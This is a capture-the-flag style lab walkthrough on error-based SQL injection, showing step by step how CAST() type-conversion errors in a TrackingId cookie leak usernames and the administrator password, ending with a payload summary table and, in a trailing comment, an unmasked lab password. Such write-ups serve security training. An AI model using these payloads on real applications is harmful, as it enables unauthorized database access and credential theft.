# 📚 **Extracting Sensitive Data via Verbose SQL Error Messages**

## 🔍 Lab Title: *Visible error-based SQL injection*

### 💡 Objective:
Demonstrate how **verbose SQL error messages** can be abused to extract sensitive data (like usernames and passwords) from a database, even in scenarios where the application does not directly return query results.

This lab simulates a real-world scenario where an attacker exploits a **SQL injection vulnerability** via a `TrackingId` cookie. By leveraging **CAST() type conversion errors**, we force the database to expose sensitive information — effectively turning a **blind SQL injection** into a **visible one**.

## 🧪 Target Overview

- Vulnerable Parameter: `TrackingId` cookie
- Injection Type: **Error-Based SQL Injection**
- Goal:
  - Extract the password of the `administrator` user.
  - Log in as administrator.

## 🧠 Key Concepts Explained

### ✅ Verbose SQL Error Messages
Some misconfigured applications or databases return **detailed error messages** that include parts of the executed SQL query or even values retrieved from the database.

These messages are gold for attackers because they can:
- Reveal SQL query structure
- Expose table/column names
- Leak sensitive data via type conversion errors

### 🔁 CAST() Function Abuse
The `CAST()` function converts one data type to another. If you try to cast a string like `'administrator'` to an incompatible type like `INT`, most databases will throw an error containing the original string:

```sql
ERROR: invalid input syntax for type integer: "administrator"
```

This lets us **leak sensitive data** through error messages.

## 🛠️ Step-by-Step Attack Walkthrough

### 1️⃣ **Confirm SQL Injection Vulnerability**

Start by injecting a single quote to trigger an SQL error:

### 📥 Payload:
```http
Cookie: TrackingId='
```

### 💡 Result:
- You see an error like:
  ```
  Unterminated string literal started at position ...
  ```

✅ This confirms SQL injection is possible.

### 2️⃣ **Test Basic CAST() Behavior**

Try casting a harmless value to int:

### 📥 Payload:
```http
Cookie: TrackingId='+AND+CAST((SELECT+1)+AS+int)--
```

### 💡 Result:
- Query executes → No error  
➡️ `CAST()` works as expected.

### 3️⃣ **Force Error with String-to-Integer Conversion**

Now try casting a string result to integer:

### 📥 Payload:
```http
Cookie: TrackingId='+AND+1=CAST((SELECT+username+FROM+users)+AS+int)--
```

### 💡 Result:
You get an error message:
```
ERROR: invalid input syntax for type integer: "administrator"
```

🎉 Success! The database leaked the username **"administrator"** via the error.

### 4️⃣ **Limit to One Row (Avoid Multiple Results)**

If multiple rows exist, the query may fail due to returning more than one result.

### 📥 Payload:
```http
Cookie: TrackingId='+AND+1=CAST((SELECT+username+FROM+users+LIMIT+1)+AS+int)--
```

### 💡 Result:
Still leaks:
```
ERROR: invalid input syntax for type integer: "administrator"
```

✅ Now we're safely extracting only one row.

### 5️⃣ **Extract Administrator Password**

Repeat the process but target the `password` field:

### 📥 Payload:
```http
Cookie: TrackingId='+AND+1=CAST((SELECT+password+FROM+users+WHERE+username='administrator'+LIMIT+1)+AS+int)--
```

### 💡 Result:
You get:
```
ERROR: invalid input syntax for type integer: "8gr8v4a5xxxxxxxxxx"
```

🎉 You've successfully extracted the **administrator password**!

## 🔐 Final Credentials

| Field | Value |
|-------|-------|
| Username | `administrator` |
| Password | `8gr8v4a5xxxxxxxxxxx` |

Go to `/login` and log in with these credentials to complete the lab.

## 🧾 Summary of Key Payloads

| Purpose | Payload |
|--------|---------|
| Confirm SQLi | `'` |
| Test CAST() behavior | `'+AND+CAST((SELECT+1)+AS+int)--` |
| Leak username | `'+AND+1=CAST((SELECT+username+from+users+LIMIT+1)+AS+int)--` |
| Leak password | `'+AND+1=CAST((SELECT+password+from+users+WHERE+username='administrator')+AS+int)--` |

## 🧠 Takeaways

- **Verbose errors** are dangerous — they can leak query structure and sensitive data.
- Use `CAST()` or similar functions to **force type-conversion errors**.
- Always use `LIMIT 1` when selecting strings to avoid multi-row errors.
- Wrap payloads in safe conditions like `1=CAST(...)` to ensure execution.
- Even blind SQL injection can become visible if error handling is poor.

## 🙌 Final Notes

Great job solving this lab! You’ve turned a silent SQL injection into a powerful data extraction tool using just a few clever tricks.

 happy hacking! 💻⚡

<!-- admin password is 8gr8v4a5mq6wh1dtlmmf -->